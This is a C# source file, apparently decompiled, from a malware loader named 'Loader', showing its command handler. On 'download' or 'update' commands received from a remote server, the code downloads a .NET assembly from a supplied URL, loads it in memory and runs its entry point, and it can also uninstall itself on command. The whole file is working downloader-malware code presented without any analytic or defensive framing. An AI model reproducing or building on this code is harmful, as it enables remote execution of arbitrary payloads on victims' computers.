using System.Net;
using System.Reflection;
using System.Runtime.CompilerServices;

namespace Loader;

internal class Commands
{
	public static void determineCommand()
	{
		string text = Connection.Command("").ToLower();
		if (text.Contains("download"))
		{
			if (!text.Contains("*"))
			{
				return;
			}
			string[] array = text.Split(new char[1] { '*' });
			if (!array[1].Contains("http"))
			{
				return;
			}
			WebClient webClient = new WebClient();
			byte[] rawAssembly = webClient.DownloadData(array[1]);
			if (array[2].Contains("1"))
			{
				Assembly assembly = Assembly.Load(rawAssembly);
				MethodInfo entryPoint = assembly.EntryPoint;
				object objectValue = RuntimeHelpers.GetObjectValue(assembly.CreateInstance(entryPoint.Name));
				if (entryPoint.GetParameters().Length > 0)
				{
					entryPoint.Invoke(RuntimeHelpers.GetObjectValue(objectValue), new object[1] { new string[1] { "1" } });
				}
				else
				{
					entryPoint.Invoke(RuntimeHelpers.GetObjectValue(objectValue), null);
				}
			}
		}
		else if (text.Contains("remove"))
		{
			Install.uninstall(null);
		}
		else
		{
			if (!text.Contains("update"))
			{
				return;
			}
			if (text.Contains("*"))
			{
				string[] array = text.Split(new char[1] { '*' });
				if (array[1].Contains("http"))
				{
					WebClient webClient = new WebClient();
					byte[] rawAssembly = webClient.DownloadData(array[1]);
					if (array[2].Contains("1"))
					{
						Assembly assembly = Assembly.Load(rawAssembly);
						MethodInfo entryPoint = assembly.EntryPoint;
						object objectValue = RuntimeHelpers.GetObjectValue(assembly.CreateInstance(entryPoint.Name));
						if (entryPoint.GetParameters().Length > 0)
						{
							entryPoint.Invoke(RuntimeHelpers.GetObjectValue(objectValue), new object[1] { new string[1] { "1" } });
						}
						else
						{
							entryPoint.Invoke(RuntimeHelpers.GetObjectValue(objectValue), null);
						}
					}
				}
			}
			Install.uninstall(null);
		}
	}
}
